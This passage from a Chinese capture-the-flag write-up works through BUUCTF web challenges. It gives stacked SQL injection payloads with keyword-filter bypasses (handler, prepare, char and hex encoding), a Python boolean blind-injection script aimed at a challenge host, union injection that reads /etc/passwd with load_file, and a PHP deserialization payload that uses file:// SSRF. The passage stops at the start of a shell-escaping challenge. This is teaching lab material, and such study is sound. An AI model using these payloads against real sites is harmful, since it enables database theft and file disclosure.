<pre><code class="hljs sql">return preg_match(&quot;/<span class="hljs-keyword">set</span>|<span class="hljs-keyword">prepare</span>|<span class="hljs-keyword">alter</span>|<span class="hljs-keyword">rename</span>|<span class="hljs-keyword">select</span>|<span class="hljs-keyword">update</span>|<span class="hljs-keyword">delete</span>|<span class="hljs-keyword">drop</span>|<span class="hljs-keyword">insert</span>|<span class="hljs-keyword">where</span>|\./i<span class="hljs-string">&quot;,$inject);</span></code></pre>
<p>只回显一部分数据</p>
<pre><code class="hljs lsl">?inject=<span class="hljs-number">1</span>&#x27;union selec\at <span class="hljs-number">1</span>,<span class="hljs-number">2</span>%<span class="hljs-number">23</span>
er version for the right syntax to use near &#x27;selec\at <span class="hljs-number">1</span>,<span class="hljs-number">2</span>#&#x27;&#x27; at line <span class="hljs-number">1</span></code></pre>
<p>猜测可能是union被吞了：尝试双写，都不行</p>
<pre><code class="hljs crystal"><span class="hljs-number">1</span><span class="hljs-string">&#x27;union union s\aelect 1,2%23</span>
<span class="hljs-string">he right syntax to use near &#x27;</span><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">s</span>\<span class="hljs-title">aelect</span> 1,2<span class="hljs-comment">#&#x27;&#x27; at line 1</span></span></code></pre>
<p>应该是检测到了union整个单词，然后报错，还是不行</p>
<pre><code class="hljs lsl"><span class="hljs-number">1</span>&#x27;u&lt;&gt;nion sel&lt;&gt;ect <span class="hljs-number">1</span>,<span class="hljs-number">2</span>%<span class="hljs-number">23</span>
t syntax to use near &#x27;u&lt;&gt;nion sel&lt;&gt;ect <span class="hljs-number">1</span>,<span class="hljs-number">2</span>#&#x27;&#x27; at line <span class="hljs-number">1</span></code></pre>
<p><strong>试试堆叠注入</strong>：查看所有库名</p>
<pre><code class="hljs sql">1&#x27;;<span class="hljs-keyword">show</span> <span class="hljs-keyword">databases</span>;   //这里1后必须要有单引号（字符注入），尾巴<span class="hljs-comment">#可要可不要</span></code></pre>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220312212801712.png" srcset="/img/loading.gif" alt="image-20220312212801712"></p>
<p>查看当前库下表名：</p>
<pre><code class="hljs sql">1&#x27;;<span class="hljs-keyword">show</span> <span class="hljs-keyword">tables</span>;<span class="hljs-comment">#</span></code></pre>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220312213008971.png" srcset="/img/loading.gif" alt="image-20220312213008971"></p>
<h4 id="利用handler直接读表内容">利用handler直接读表内容</h4>
<blockquote>
<p><strong>mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据</strong></p>
<p><strong>不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中</strong></p>
</blockquote>
<pre><code class="hljs sql">?inject=1&#x27;;<span class="hljs-keyword">handler</span> FlagHere <span class="hljs-keyword">open</span> <span class="hljs-keyword">as</span> a;<span class="hljs-keyword">handler</span> a <span class="hljs-keyword">read</span> <span class="hljs-keyword">first</span>;<span class="hljs-keyword">handler</span> a <span class="hljs-keyword">close</span>;<span class="hljs-comment">#</span></code></pre>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220312213440831.png" srcset="/img/loading.gif" alt="image-20220312213440831"></p>
<p>读表列名：flag表有一列</p>
<pre><code class="hljs sql">1&#x27;;<span class="hljs-keyword">show</span> <span class="hljs-keyword">columns</span> <span class="hljs-keyword">from</span> <span class="hljs-string">`FlagHere`</span>;</code></pre>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220312213600223.png" srcset="/img/loading.gif" alt="image-20220312213600223" style="zoom:67%;"></p>
<p>而另一张表：有两列</p>
<pre><code class="hljs sql">1&#x27;;<span class="hljs-keyword">show</span> <span class="hljs-keyword">columns</span> <span class="hljs-keyword">from</span> <span class="hljs-string">`words`</span>;</code></pre>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220313100505291.png" srcset="/img/loading.gif" alt="image-20220313100505291" style="zoom:50%;"></p>
<h4 id="如果利用强网杯的思路">如果利用强网杯的思路：</h4>
<blockquote>
<p>1、将words表名替换成其他的</p>
<p>2、然后将 <code>FlagHere</code> 这个表名称替换成words</p>
<p>3、在把flag这个字段替换成data</p>
<p>4、最后再插入（新增）一个id字段</p>
<p>最终的查询结果就可以输出我们构造的新的words了</p>
</blockquote>
<pre><code class="hljs sql">1&#x27;;
<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> words <span class="hljs-keyword">rename</span> <span class="hljs-keyword">to</span> words1;
<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> <span class="hljs-string">`FlagHere`</span> <span class="hljs-keyword">rename</span> <span class="hljs-keyword">to</span> words;
<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> words <span class="hljs-keyword">change</span> flag <span class="hljs-keyword">id</span> <span class="hljs-built_in">varchar</span>(<span class="hljs-number">50</span>);<span class="hljs-comment">#</span>

再利用万能密码爆出表数据</code></pre>
<p>但是回显，发现过滤了很多：</p>
<pre><code class="hljs sql">return preg_match(&quot;/<span class="hljs-keyword">set</span>|<span class="hljs-keyword">prepare</span>|<span class="hljs-keyword">alter</span>|<span class="hljs-keyword">rename</span>|<span class="hljs-keyword">select</span>|<span class="hljs-keyword">update</span>|<span class="hljs-keyword">delete</span>|<span class="hljs-keyword">drop</span>|<span class="hljs-keyword">insert</span>|<span class="hljs-keyword">where</span>|\./i<span class="hljs-string">&quot;,$inject);</span></code></pre>
<p>那就只能用handler</p>
<h4 id="总结">总结：</h4>
<p>1.prepare的语句</p>
<pre><code class="hljs sql"><span class="hljs-keyword">PREPARE</span> <span class="hljs-keyword">name</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;[my sql sequece]&#x27;</span>;   //预定义SQL语句
<span class="hljs-keyword">EXECUTE</span> <span class="hljs-keyword">name</span>;  //执行预定义SQL语句
(<span class="hljs-keyword">DEALLOCATE</span> || <span class="hljs-keyword">DROP</span>) <span class="hljs-keyword">PREPARE</span> <span class="hljs-keyword">name</span>;  //删除预定义SQL语句，可以不用！

即：
<span class="hljs-keyword">SET</span> @tn = <span class="hljs-string">&#x27;hahaha&#x27;</span>;  //存储表名
<span class="hljs-keyword">SET</span> @<span class="hljs-keyword">sql</span> = <span class="hljs-keyword">concat</span>(<span class="hljs-string">&#x27;select * from &#x27;</span>, @tn);  //存储SQL语句
<span class="hljs-keyword">PREPARE</span> <span class="hljs-keyword">name</span> <span class="hljs-keyword">from</span> @<span class="hljs-keyword">sql</span>;   //预定义SQL语句
<span class="hljs-keyword">EXECUTE</span> <span class="hljs-keyword">name</span>;  //执行预定义SQL语句
(<span class="hljs-keyword">DEALLOCATE</span> || <span class="hljs-keyword">DROP</span>) <span class="hljs-keyword">PREPARE</span> sqla;  //删除预定义SQL语句（可以不用）</code></pre>
<p>2.select被过滤的姿势</p>
<pre><code class="hljs lsl">大小写绕过、&lt;&gt;、双写、%<span class="hljs-number">0</span>a、%<span class="hljs-number">0</span>d、/！**/

利用char函数，select——char(<span class="hljs-number">115</span>,<span class="hljs-number">101</span>,<span class="hljs-number">108</span>,<span class="hljs-number">101</span>,<span class="hljs-number">99</span>,<span class="hljs-number">116</span>)
<span class="hljs-number">1</span>&#x27;;PREPARE jwt from concat(char(<span class="hljs-number">115</span>,<span class="hljs-number">101</span>,<span class="hljs-number">108</span>,<span class="hljs-number">101</span>,<span class="hljs-number">99</span>,<span class="hljs-number">116</span>), &#x27; * from `<span class="hljs-number">1919810931114514</span>` &#x27;);EXECUTE jwt;#

可以拼接<span class="hljs-number">1</span>&#x27;;set @a=concat(<span class="hljs-string">&quot;sel&quot;</span>,<span class="hljs-string">&quot;ect flag from 1919810931114514&quot;</span>);prepare hello from @a;execute hello;# 

用handler代替，handler直接读表的一行数据
<span class="hljs-number">1</span>&#x27;;handler `<span class="hljs-number">1919810931114514</span>` open as a;
handler a read first;
handler a close;#  <span class="hljs-comment">//注意：这里有的题必须close handler才可以获取Flag</span>

或利用十六进制编码绕过
set @a=concat(<span class="hljs-string">&quot;sel&quot;</span>,<span class="hljs-string">&quot;ect flag from `1919810931114514`&quot;</span>); 
<span class="hljs-comment">//或者将select * from ` 1919810931114514 `进行16进制编码</span>
<span class="hljs-comment">//@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span>
prepare hello from @a；
execute hello;</code></pre>
<h2 id="ciscn2019-华北赛区-day2-web1hack-world">[CISCN2019 华北赛区 Day2
Web1]Hack World</h2>
<h4 id="考点盲注只回显trueflasepython脚本判断字符爆flag">考点：盲注只回显true/flase、python脚本判断字符爆flag</h4>
<p>思路：输入框测试发现回显bool(false)、无报错，对关键词敏感，但是发现输入4/2对应输出2的内容——说明有逻辑判断，尝试if语句，成功——写脚本爆出flag</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://inanb.github.io/2021/01/30/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/">参考WP</a></p>
</blockquote>
<pre><code class="hljs lsl">输入<span class="hljs-number">1</span>回显Hello, glzjin wants a girlfriend.
输入<span class="hljs-number">2</span>回显Do you want to be my girlfriend?
输入‘回显**bool(false)**
输入<span class="hljs-number">1</span> and <span class="hljs-number">1</span>=<span class="hljs-number">1</span> ,SQL Injection Checked.
输入&#x27;%<span class="hljs-number">23</span>，SQL Injection Checked.
<span class="hljs-number">4</span>/<span class="hljs-number">2</span>——Do you want to be my girlfriend?
只有两个数据，输入<span class="hljs-number">3</span>及以上就返回Error Occured When Fetch Result.</code></pre>
<p><strong>但是好多字符包括空格都给过滤了</strong></p>
<p>但是：1/1、4/2是可以出结果的，也就是说，可以借助<strong>逻辑判断</strong>返回1和0，判断逻辑的真假。</p>
<blockquote>
<p>if类似三目运算
if(条件,expr2,expr3)，如果条件为true,则返回expr2的值，否则返回3</p>
</blockquote>
<p>布尔盲注：只返回true/false</p>
<p>空格被过滤：利用（）</p>
<pre><code class="hljs subunit">id=if(length((select(flag)from(flag)))=42,1,0)
Hello, glzjin wants a girlfriend.
id=if(length((select(flag)from(flag)))=43,1,0)
<span class="hljs-keyword">Error </span>Occured When Fetch Result.</code></pre>
<p>说明flag长度是42</p>
<h4 id="guid">GUID</h4>
<p>什么是 GUID？又叫uuid（通用标识符）</p>
<ul>
<li><p>全球唯一标识符 (GUID)
是一个字母数字标识符，用于指示产品的唯一性安装。在许多流行软件应用程序（例如
Web 浏览器和媒体播放器）中，都使用 GUID。</p></li>
<li><p>GUID 的格式为“xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx”，其中每个 x
是 0-9 或 a-f
范围内的一个十六进制的数字。例如：6F9619FF-8B86-D011-B42D-00C04FC964FF
即为有效的 GUID 值</p></li>
<li><p>{CAF53C68-A94C-11D2-BB4A-00C04FA330A6}</p></li>
</ul>
<p>先写出一个核心的语句，判断flag的第一个字符是否ascii码为101</p>
<pre><code class="hljs angelscript"><span class="hljs-keyword">if</span>((ascii(substr((select(flag)<span class="hljs-keyword">from</span>(flag)),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">101</span>),<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)
ASCII <span class="hljs-number">101</span> :e
Do you want to be my girlfriend?  <span class="hljs-comment">//说明不是e	</span></code></pre>
<p>然后放到burp里爆出第一个字符是f，ASCII为102</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220313112559474.png" srcset="/img/loading.gif" alt="image-20220313112559474" style="zoom:67%;"></p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> time
url = <span class="hljs-string">&#x27;http://9a1163f4-44f5-4def-9fca-a0c669acfeae.node4.buuoj.cn:81/index.php&#x27;</span>
flag=<span class="hljs-string">&quot;&quot;</span>
<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">43</span>):
    l = <span class="hljs-number">32</span>
    r = <span class="hljs-number">126</span>
    <span class="hljs-keyword">while</span> r &gt; l:
        mid = <span class="hljs-built_in">int</span>((l+r+<span class="hljs-number">1</span>) / <span class="hljs-number">2</span>)
        x = <span class="hljs-built_in">str</span>(x)
        y = <span class="hljs-built_in">str</span>(mid)
        <span class="hljs-built_in">id</span> = &#123;<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-string">&#x27;if(ascii(substr((select(flag)from(flag)),&#x27;</span>+x+<span class="hljs-string">&#x27;,1))&gt;=&#x27;</span>+y+<span class="hljs-string">&#x27;,1,0)&#x27;</span>&#125;  <span class="hljs-comment">#python字符串拼接用+</span>
        response = requests.post(url=url,data=<span class="hljs-built_in">id</span>)
        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Hello&quot;</span> <span class="hljs-keyword">in</span> response.text:
            l = mid
        <span class="hljs-keyword">else</span>:
            r = mid<span class="hljs-number">-1</span>
        time.sleep(<span class="hljs-number">0.03</span>)  <span class="hljs-comment">#延时处理防止频繁访问导致网页不正常回显产生坏点（得益于sql延时注入了解了sleep函数）</span>
    flag+=(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(r)))
    print(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(r)))
print(flag)</code></pre>
<h2 id="网鼎杯-2018fakebook">[网鼎杯 2018]Fakebook</h2>
<h4 id="考点sql注入反序列化curl_execssrf">考点：SQL注入、反序列化+curl_exec、SSRF</h4>
<p>访问tobots.txt，得到备份文件</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220313134519393.png" srcset="/img/loading.gif" alt="image-20220313134519393"></p>
<p>访问/user.php.bak，下载备份文件，得到php代码</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span></span>
<span class="hljs-class"></span>&#123;
    <span class="hljs-keyword">public</span> $name = <span class="hljs-string">&quot;&quot;</span>;
    <span class="hljs-keyword">public</span> $age = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">public</span> $blog = <span class="hljs-string">&quot;&quot;</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$name, $age, $blog</span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;name = $name;
        <span class="hljs-keyword">$this</span>-&gt;age = (<span class="hljs-keyword">int</span>)$age;
        <span class="hljs-keyword">$this</span>-&gt;blog = $blog;
    &#125;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params">$url</span>)</span>
<span class="hljs-function">    </span>&#123;
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);
        $output = curl_exec($ch);   <span class="hljs-comment">//注意！SSRF</span>
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        <span class="hljs-keyword">if</span>($httpCode == <span class="hljs-number">404</span>) &#123;
            <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;
        &#125;
        curl_close($ch);

        <span class="hljs-keyword">return</span> $output;
    &#125;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> (<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;get(<span class="hljs-keyword">$this</span>-&gt;blog);
    &#125;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> (<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        $blog = <span class="hljs-keyword">$this</span>-&gt;blog;
        <span class="hljs-keyword">return</span> preg_match(<span class="hljs-string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, $blog);
    &#125;

&#125;</code></pre>
<p>get方法中，<strong>curl_exec()如果使用不当就会导致ssrf漏洞</strong>。有一点思路了，而我们在御剑扫到了flag.php（我没扫到，猜测跟index.php在同一目录）。猜测可能flag.php处于内网，</p>
<p>如果用ssrf访问flag.php，可以==用伪协议file://var/www/html/flag.php访问。==</p>
<ol type="1">
<li>随便注册一个用户abd,密码123，age11，blog:https://www.baidu.com，访问注册的用户，发现返回刚刚注册的内容，blog是输入的www.baidu.com</li>
</ol>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220313152014417.png" srcset="/img/loading.gif" alt="image-20220313152014417"></p>
<ol start="2" type="1">
<li>然后下面的content查看源码，解码发现是www.baidu.com的首页内容==》<strong>有思路了</strong>，blog用file://读本地文件，下面的content回显base64的文件源码，利用ssrf伪协议读本地源码</li>
</ol>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220313152050715.png" srcset="/img/loading.gif" alt="image-20220313152050715"></p>
<ol start="3" type="1">
<li><p>但是直接注册用户，blog那里有严格的preg过滤：<strong>所以想在这个位置运用file协议不行</strong></p></li>
<li><p>注册用户后，访问用户时发现url里有<strong>参数no，尝试修改，发现注入点，但也有waf</strong></p></li>
</ol>
<pre><code class="hljs pgsql">/<span class="hljs-keyword">view</span>.php?<span class="hljs-keyword">no</span>=<span class="hljs-number">1</span>%<span class="hljs-number">20</span><span class="hljs-keyword">order</span>%<span class="hljs-number">20</span><span class="hljs-keyword">by</span>%<span class="hljs-number">205</span>   //  [*] query error! (<span class="hljs-type">Unknown</span> <span class="hljs-keyword">column</span> <span class="hljs-string">&#x27;5&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;order clause&#x27;</span>)——<span class="hljs-number">4</span>列

/<span class="hljs-keyword">view</span>.php?<span class="hljs-keyword">no</span>=<span class="hljs-number">1</span>%<span class="hljs-number">27</span><span class="hljs-keyword">union</span>%<span class="hljs-number">20</span><span class="hljs-keyword">select</span>%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>%<span class="hljs-number">23</span>  //<span class="hljs-keyword">no</span> hack ~_~

/<span class="hljs-keyword">view</span>.php?<span class="hljs-keyword">no</span>=<span class="hljs-number">1</span>^updatexml   //[*] query error! (<span class="hljs-type">Unknown</span> <span class="hljs-keyword">column</span> <span class="hljs-string">&#x27;updatexml&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;where clause&#x27;</span>)
/<span class="hljs-keyword">view</span>.php?<span class="hljs-keyword">no</span>=<span class="hljs-number">1</span>^<span class="hljs-keyword">if</span>(length((<span class="hljs-keyword">select</span>(flag)<span class="hljs-keyword">from</span>(information_schema.schemata)))=<span class="hljs-number">42</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)  //[*] query error! (<span class="hljs-type">Unknown</span> <span class="hljs-keyword">column</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;field list&#x27;</span>)   //information_schema.schemata 所有库名

/<span class="hljs-keyword">view</span>.php?<span class="hljs-keyword">no</span>=<span class="hljs-number">1</span>^<span class="hljs-keyword">if</span>(length((<span class="hljs-keyword">select</span>(passwd)<span class="hljs-keyword">from</span>(information_schema.<span class="hljs-keyword">tables</span>)))=<span class="hljs-number">42</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)
//information_schema.<span class="hljs-keyword">tables</span>：所有表集合，

<span class="hljs-number">1</span>^<span class="hljs-keyword">if</span>(length((<span class="hljs-keyword">select</span>(passwd)<span class="hljs-keyword">from</span>(users)))=<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)，爆出<span class="hljs-keyword">password</span>长度：<span class="hljs-number">128</span>   //太麻烦了，卡壳，不知道咋读表、列名了</code></pre>
<ol start="5" type="1">
<li>查看WP发现unionselect被过滤，而且只对他俩中间得空格过滤——==中间加/**/即可绕过==</li>
</ol>
<pre><code class="hljs crystal"> ?no=-<span class="hljs-number">1</span> <span class="hljs-class"><span class="hljs-keyword">union</span>/**/<span class="hljs-title">select</span> 1,<span class="hljs-title">user</span>(),3,4--+　　　　//数据库信息</span>
root@localhost	  ==》root权限，可以sql读文件</code></pre>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220313144801377.png" srcset="/img/loading.gif" alt="image-20220313144801377" style="zoom: 50%;"></p>
<h4 id="法1sql注入root直接读本地文件">法1：SQL注入root直接读本地文件</h4>
<p>secure-file-priv是一个系统变量，对于文件读/写功能进行限制。具体如下：</p>
<ul>
<li><p>无内容，表示无限制。</p></li>
<li><p>为NULL，表示禁止文件读/写。</p></li>
<li><p>为目录名，表示仅允许对特定目录的文件进行读/写。</p></li>
<li><p>三种方法查看当前<code>secure-file-priv</code>的值：</p>
<pre><code class="hljs sql"><span class="hljs-keyword">select</span> @@secure_file_priv;
<span class="hljs-keyword">select</span> @@global.secure_file_priv;
<span class="hljs-keyword">show</span> <span class="hljs-keyword">variables</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&quot;secure_file_priv&quot;</span>;</code></pre></li>
</ul>
<p>读文件：</p>
<ul>
<li><p>Mysql读取文件通常使用load_file函数，语法如下：【==限制：secure-file-priv无值（root）、绝对路径、文件必须在服务器上==】</p></li>
<li><p>``` select load_file(file_path); <pre><code class="hljs sql">
- ```
  <span class="hljs-keyword">load</span> <span class="hljs-keyword">data</span> <span class="hljs-keyword">infile</span> <span class="hljs-string">&quot;/etc/passwd&quot;</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">table</span> <span class="hljs-keyword">test</span> <span class="hljs-keyword">FIELDS</span> <span class="hljs-keyword">TERMINATED</span> <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;\n&#x27;</span>; <span class="hljs-comment">#读取服务端文件</span></code></pre></p></li>
</ul>
<pre><code class="hljs crystal">-<span class="hljs-number">1</span> <span class="hljs-class"><span class="hljs-keyword">union</span>/**/<span class="hljs-title">select</span> 1,@@<span class="hljs-title">secure_file_priv</span>,3,4--+    //回显空--说明无限制</span>
/view.php?no=-<span class="hljs-number">1</span> <span class="hljs-class"><span class="hljs-keyword">union</span>/**/<span class="hljs-title">select</span> 1,<span class="hljs-title">load_file</span>(&#x27;/<span class="hljs-title">etc</span>/<span class="hljs-title">passwd</span>&#x27;),3,4--+   成功读到系统文件</span></code></pre>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220313145336505.png" srcset="/img/loading.gif" alt="image-20220313145336505"></p>
<p>payload：==注意！flag在源码==</p>
<pre><code class="hljs crystal">view.php?no=-<span class="hljs-number">1</span> <span class="hljs-class"><span class="hljs-keyword">union</span>/**/<span class="hljs-title">select</span> 1,<span class="hljs-title">load_file</span>(&#x27;/<span class="hljs-title">var</span>/<span class="hljs-title">www</span>/<span class="hljs-title">html</span>/<span class="hljs-title">flag</span>.<span class="hljs-title">php</span>&#x27;),3,4--+</span></code></pre>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220313145628120.png" srcset="/img/loading.gif" alt="image-20220313145628120"></p>
<h4 id="法2反序列化ssrf读本地文件">法2：反序列化+SSRF读本地文件</h4>
<p>继续注入，已知表是facebook</p>
<p>爆当前库下所有表名：</p>
<pre><code class="hljs pgsql"><span class="hljs-keyword">view</span>.php?<span class="hljs-keyword">no</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>(),<span class="hljs-number">3</span>,<span class="hljs-number">4</span><span class="hljs-comment">--+   错！，回显位置在中间时，from应该在select所有的后面</span>
<span class="hljs-keyword">view</span>.php?<span class="hljs-keyword">no</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<span class="hljs-comment">--+   //users表</span></code></pre>
<p>爆users表列名：</p>
<pre><code class="hljs pgsql"><span class="hljs-keyword">view</span>.php?<span class="hljs-keyword">no</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span><span class="hljs-comment">--+</span>
<span class="hljs-keyword">no</span>,username,passwd,data,<span class="hljs-keyword">USER</span>,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</code></pre>
<p>爆字段：</p>
<pre><code class="hljs crystal">view.php?no=-<span class="hljs-number">1</span> <span class="hljs-class"><span class="hljs-keyword">union</span>/**/<span class="hljs-title">select</span> 1,<span class="hljs-title">concat_ws</span>(&#x27;--&#x27;,<span class="hljs-title">no</span>,<span class="hljs-title">username</span>,<span class="hljs-title">passwd</span>,<span class="hljs-title">data</span>),3,4 <span class="hljs-title">from</span> <span class="hljs-title">users</span>--+</span></code></pre>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220313150748223.png" srcset="/img/loading.gif" alt="image-20220313150748223"></p>
<ul>
<li>然后注意注入时一直都有的报错，大概意思是unserialize没有读取到参数</li>
</ul>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220313151150653.png" srcset="/img/loading.gif" alt="image-20220313151150653"></p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220313151308157.png" srcset="/img/loading.gif" alt="image-20220313151308157"></p>
<ul>
<li>这个data就是序列化后的字符串，与一开始得到的源码有关联了，<strong>因为页面提示了我们反序列化，所以猜测no参数的值代入数据库查询之后还会被反序列化一次，这个时候就会导致blog变异，读任意文件</strong></li>
</ul>
<p>尝试把序列化字符传入不同位置，发现在4的位置成功读取序列化字符串，并反序列化返回www.baidu.com的base64内容</p>
<p>构造payload读取flag:</p>
<pre><code class="hljs css">一开始：
<span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:8</span><span class="hljs-selector-pseudo">:&quot;UserInfo&quot;</span><span class="hljs-selector-pseudo">:3</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;abc&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">11</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">21</span>:<span class="hljs-string">&quot;https://www.baidu.com&quot;</span>;&#125;
构造：
<span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:8</span><span class="hljs-selector-pseudo">:&quot;UserInfo&quot;</span><span class="hljs-selector-pseudo">:3</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;abc&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">11</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">29</span>:<span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;&#125;</code></pre>
<p>成功读到base64，解码得到flag</p>
<h2 id="buuctf-2018online-tool">[BUUCTF 2018]Online Tool</h2>
<p>考点：escapeshellarg()和escapeshellcmd()这个点，外加一个nmap的文件写入。</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_26406447/article/details/100711933">参考WP1</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_52907838/article/details/119115412?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-0.pc_relevant_default&amp;spm=1001.2101.3001.4242.1&amp;utm_relevant_index=1">参考WP2</a></p>
</blockquote>
<p>点进去得到源码</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_SERVER[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;
